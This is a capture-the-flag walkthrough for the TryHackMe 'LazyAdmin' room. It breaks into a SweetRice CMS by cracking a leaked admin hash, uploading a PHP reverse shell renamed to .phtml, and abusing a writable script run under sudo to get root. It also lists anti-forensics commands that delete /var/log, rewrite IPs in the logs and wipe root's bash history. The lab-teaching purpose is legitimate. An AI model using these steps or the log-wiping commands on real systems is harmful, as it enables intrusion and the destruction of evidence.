---
title: "THM:lazyadmin"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/lazyadmin"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,searchsploit,apache,ubuntu,mysql,linpeas,privesc,upload,file-upload-bypass,sudo,sweetrice,cms
page_excerpts: true
---
# THM:lazyadmin

URL: [https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> Easy linux machine to practice your skills

## Scanning

### Running: `nmap`

Ran the following:

> `nmap xxx.xxx.xxx.xxx`

Interesting ports found to be open:

```python
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

*Also see: [nmap.log](nmap.log)*

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://xxx.xxx.xxx.xxx`

Interesting folders found:

```python
/content              (Status: 301) [Size: 314] [--> http://10.10.223.52/content/]
```

When we navigate to this page, we see it branded a "SweetRice CMS". Once we see a full-fledged app installed there, we run another `gobuster` from the root of the app folder (`/content`):

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://xxx.xxx.xxx.xxx/content`

*Also see: [gobuster.log](gobuster.log) and [gobuster2.log](gobuster2.log)*

### Running: `searchsploit`

Since it looks like some layered-software is installed called "SweetRice", we can see if there are any easy exploits available.

Ran the following:

> `searchsploit SweetRice`

That results in quite a few vulnerabilities:

```python
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                           | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                        | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                         | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                           | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                               | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                      | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload             | php/webapps/14184.txt
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The files with the details on the right, are in the following folder: `/usr/share/exploitdb/exploits/`

View each file to look for an exploit that seems interesting to you.

*Also see: [searchsploit.log](searchsploit.log)*

## Gaining Access

One potential way into this server is via the exploit defined in `/usr/share/exploitdb/exploits/php/webapps/40718.txt`. This just states:

> *You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup*
>  
> *and can access to website files backup from:
http://localhost/SweetRice-transfer.zip*

So, if we navigate to where the SweetRice application is (`/content`) and then navigate to the backup folder, sure-enough, we can download a backup `.sql` file from http://10.10.223.52/content/inc/mysql_backup/.

### Inside the `.sql`  File

This file looks to be a PHP file for rebuilding the database structure. Doing a search in that file for "pass" brings us to a line like this:

`s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";`

So maybe the admin account is `manager` and maybe that hash at the end is a crackable password? Let's try to paste that value over at https://crackstation.net/ - and yes, that was an unsalted password hash.

*Also see: [mysql_bakup_20191129023059-1.5.1.sql](mysql_bakup_20191129023059-1.5.1.sql)*

### Getting Admin Access on the Site

Now that we have the username and password, `gobuster` found a directory on the website: `/content/as` that has a login page. We can log into the app from there using the `manager` account and cracked password from the previous step.

### Unprivileged Access: File Upload Bypass

In the "Media Center" navigation on the left (http://10.10.223.52/content/as/?type=media_center), it looks like we can upload files. Since this is a PHP website, we might be able to upload a [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

When we try to upload it with a `.php` file extension, nothing happens. So, we might guess that the file extension is blocked. However, PHP supports several file extensions:

- `.php`
- `.php3`
- `.php4`
- `.php5`
- `.phtml`

What it we rename the file to `.phtml` for example? That works!

#### Get Set Up

Now that we know we can upload and execute a PHP file, let's modify the reverse shell to point back to our IP address, and then let's go stand up a netcat listener:

> `nc -lvnp 9999`

Then, we click on the Reverse Shell script that we uploaded on the Media Center page to execute; we check back on our terminal and we've caught the session!

In Netcat, when we catch the session, we have a very primitive TTY connection. One of the ways to upgrade it is to run:

> `python3 -c 'import pty; pty.spawn("/bin/bash")'`

You can find the TryHackMe user flag in `/home/itguy`.

### Privilege Escalation

Logged-in as the unprivileged `www-data` account, we run: `sudo -l` to see if we have any sudo privileges. We have just one:

`(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl`

When we look at that `backup.pl`, all that does is call `/etc/copy.sh`. We do NOT have privilege to modify `backup.pl`, but we DO have `RWX` for the `/etc/copy.sh` for some reason.

So, the obvious kill-chain could be:

- Modify `/etc/copy.sh` to do something we want.
- Run `sudo /usr/bin/perl /home/itguy/backup.pl`, which will run `copy.sh` as root, and execute the code we want to run, as root.

We could have `copy.sh` do all kinds of things. Since this is a simple CTF, we can afford to be destructive. However, in the future, it might be worth re-capturing this server to practice other non-destructive ways to quite privesc.

So - one **destructive** thing we could so is overwrite `copy.sh` to just spawn a bash prompt. Since we don't have a "real" terminal session over NetCat, we could just do this:

> `echo "/bin/bash" > /etc/copy.sh`

Then, run:

> `sudo /usr/bin/perl /home/itguy/backup.pl`

And we get a bash prompt as root! You can get the TryHackMe flag from `/root/`.

## More to do?

There are many other options with this box, so it is a good box if you wanted to practice your skills in a few areas. Also, in the SweetRice dashboard where we're logged in as `manager`, on the Settings page (http://10.10.223.52/content/as/?type=setting) it has the MySQL account and password. So for practice, it might be interesting to see what you can do with viewing or exfiltrating that MySQL data.

## Maintaining Access

None needed.

## Clearing Tracks

This is a test machine. However, in a Red Team scenario, we could:

### Delete relevant logs from `/var/log/` - although that might draw attention.

> `rm -Rf /var/log/*`

### Search and replace our IP address in all logs via: 

> `find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;`

### Wipe bash history for any accounts we used via: 

> `cat /dev/null > /root/.bash_history`

## Summary

Completed: [2022-02-09 23:31:54]